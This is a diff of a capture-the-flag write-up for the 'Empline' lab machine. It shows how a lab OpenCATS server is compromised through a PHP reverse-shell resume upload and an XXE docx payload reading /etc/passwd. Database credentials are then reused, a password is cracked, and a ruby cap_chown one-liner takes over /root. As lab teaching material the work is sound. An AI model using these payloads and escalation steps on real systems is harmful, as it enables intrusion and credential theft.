@@ -28,28 +28,34 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
 ```
+Looking at the results, we have port 22, 3306 and 80.
+
 ### PORT 80
 
-The port 80 hosted a website.
 ![image](https://user-images.githubusercontent.com/43528306/138642355-d900a779-6dd5-4f98-8b7a-642c5e7d243d.png)
 
-The website seems almost static except the `Employement` tab which points us to `job.empline.thm/careers`.
-Looking at this subdomain, we found
+The website seems almost static except the `Employement` tab which points us to `job.empline.thm/careers`. We need to add this subdomain to our `/etc/hosts` file.
+
+Looking at this subdomain, we found the webserver was running *OpenCATS*, which is free and open source Application Tracking System. The page also list the current openings and a *apply* button.
 
 ![image](https://user-images.githubusercontent.com/43528306/138642494-2e4bd5e0-90eb-4bf1-9790-54828408558b.png)
 
-Using `Apply to this job` we have a upload functionality.
+Using `Apply to Position` button, the application allow us to upload our Resume file and other details to apply for the job.
+
 # Exploit
 It was exploitable in two ways:
 
 ## Using Uploading PHP shell
-As the application was written in PHP, we can try to upload a PHP reverse shell. Uploading the Shell and submitting the form, we recieved `Resume was uploaded succesful`. Navigating to 
-`job.empline.thm/upload`, we can see our PHP shell was uploaded successfuly. Using this we can get a reverse shell.
+As the application was written in PHP, we can try to upload a PHP reverse shell using Resume upload functionality. Uploading the Shell and submitting the form, we recieved `Resume was uploaded succesful`. 
+
+As the application was open-source, we can find the complete directory structure from Github. We found `/upload` directory, navigating to `job.empline.thm/upload`, we can see our PHP shell was uploaded successfuly, using which we can get a reverse shell.
 
 
 ## Using XXE 
-The application was vulnerable to XXE attack [here](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/), where we can upload are resume. Docx file are basically zipped XML files. As the application was reading our *resume.docx* and extracting out the data,
-we can assume that its parsing the whole file to extract data from it. To create a malicious docx, we need
+The application was vulnerable to XXE attack as mentioned in this [blogpost](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/), where we can upload are resume. 
+
+Docx file are basically zipped XML files. As the application was reading our *resume.docx* and extracting out the data,
+we can assume that its parsing the whole file to extract data from it. We can create a simple docx using the following code
 ```python
 from docx import Document
 
@@ -58,8 +64,8 @@ paragraph = document.add_paragraph("Rocklee")
 document.save('resume.docx')
 ```
 ### Creating Malicious docx
-The above script will create a simple docx file with our name in it. 
-- Now, we need to unzip the docx file.
+The script created the .docx file, to modify it according to our purpose, we need to change few things in the file. For this,
+- We need to unzip the docx file.
 - Modify the content of `word/document.xml`. After first line, add following paylaod:
 ```xml
 <!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
@@ -87,27 +93,24 @@ define('DATABASE_PASS', 'ng6pUFvsGNtw');
 define('DATABASE_HOST', 'localhost');                                                                                                                                    
 define('DATABASE_NAME', 'opencats');
 ```
-> Initially, I got foothold using PHP shell upload
 
 ### Shell as www-data
-
-Looking at `config.php`
-```php
-/* Database configuration. */                                                       
-define('DATABASE_USER', 'james');                                                   
-define('DATABASE_PASS', 'ng6pUFvsGNtw');                                            
-define('DATABASE_HOST', 'localhost');                                                                                                                                    
-define('DATABASE_NAME', 'opencats');
-```
-
-Looking at users on the system.
+ We got shell on the box, lets start enumerating the box. Looking at passwd file, we found other users available on the box.
 ```bash
 cat /etc/passwd | grep sh$
 root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
 george:x:1002:1002::/home/george:/bin/bash
 ```
-Using the creds we found, we can login into mysql.
+ Looking at the `config.php` in web root folder,
+ ```php
+/* Database configuration. */                                                       
+define('DATABASE_USER', 'james');                                                   
+define('DATABASE_PASS', 'ng6pUFvsGNtw');                                            
+define('DATABASE_HOST', 'localhost');                                                                                                                                    
+define('DATABASE_NAME', 'opencats');
+```
+Config file contains creds for MySQL. As from our nmap scan, we confirm that MySQL was running on the box, we can use the creds to login into MySQL.
 ```mysql
 MariaDB [opencats]> select * from user\G;
 ...[snip]...
@@ -123,28 +126,22 @@ The database contains a users table with password and username. The password has
 Using crackstation, we found the password `pretonnevippasempre`
 
 ### Shell as George
-Now we can read user.txt file.
+As we already have the password for the user, we can SSH using the creds we found on the box. Now we can read user.txt file.
 
+Running LinPeas, we found capabilities set on `ruby`.
 ```bash
 george@empline:/$ getcap -r / 2>/dev/null 
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/local/bin/ruby = cap_chown+ep
 ```
-Ruby was having a capablity of `cap_chown`, using this we can change owner of a file. Looking at docs, we found a way to do this in ruby which require user-id and gid to which we want to change this to.
+Ruby was having a capablity of `cap_chown`, This capability allow us to change owner of a file. Looking at [docs](https://apidock.com/ruby/File/chown/class), we found a way to do this in ruby which require user-id and gid to which we want to change this to.
 ```bash
-george@empline:/dev/shm$ ruby -e 'require "fileutils";FileUtils.chown(1002,1002,"/root")'                                                                                
-george@empline:/dev/shm$ cd /root                                                                                                                                        
-george@empline:/root$ ls -la                                                                                                                                             
-total 36                                                                                                                                                                 
-drwx------  4 george george 4096 Jul 20 19:52 .                                                                                                                          
-drwxr-xr-x 24 root   root   4096 Oct 25 04:34 ..                                                                                                                         
--rw-------  1 root   root      5 Jul 20 19:52 .bash_history                                                                                                              
--rw-r--r--  1 root   root   3106 Apr  9  2018 .bashrc                                                                                                                    
-drwxr-xr-x  3 root   root   4096 Jul 20 19:49 .local                                                                                                                     
--rw-r--r--  1 root   root    148 Aug 17  2015 .profile                                                                                                                   
-drwx------  2 root   root   4096 Jul 20 19:45 .ssh                                                                                                                       
--rw-r--r--  1 root   root    227 Jul 20 19:48 .wget-hsts                                                                                                                 
--rw-r--r--  1 root   root     33 Jul 20 19:48 root.txt           
+george@empline:/dev/shm$ ruby -e 'require "fileutils";FileUtils.chown(1002,1002,"/root")'                                                                         
+george@empline:/dev/shm$ cd /root                                                                                                                                 george@empline:/root$ ls -la                                                                                                                                       total 36                                                                                                                                                           drwx------  4 george george 4096 Jul 20 19:52 .                                                                                                                   drwxr-xr-x 24 root   root   4096 Oct 25 04:34 ..                                                                                                                   -rw-------  1 root   root      5 Jul 20 19:52 .bash_history                                                                                                       -rw-r--r--  1 root   root   3106 Apr  9  2018 .bashrc                                                                                                             drwxr-xr-x  3 root   root   4096 Jul 20 19:49 .local                                                                                                               -rw-r--r--  1 root   root    148 Aug 17  2015 .profile                                                                                                             drwx------  2 root   root   4096 Jul 20 19:45 .ssh                                                                                                                 -rw-r--r--  1 root   root    227 Jul 20 19:48 .wget-hsts                                                                                                           -rw-r--r--  1 root   root     33 Jul 20 19:48 root.txt           
 ```
+We have now changed the permission of `/root` directory. From here, we can either grab ssh private keys of root, or we can change the permission of *shadow* file and the change the root's password.
 
 ROOT!!
+
+---
+- https://man7.org/linux/man-pages/man7/capabilities.7.html
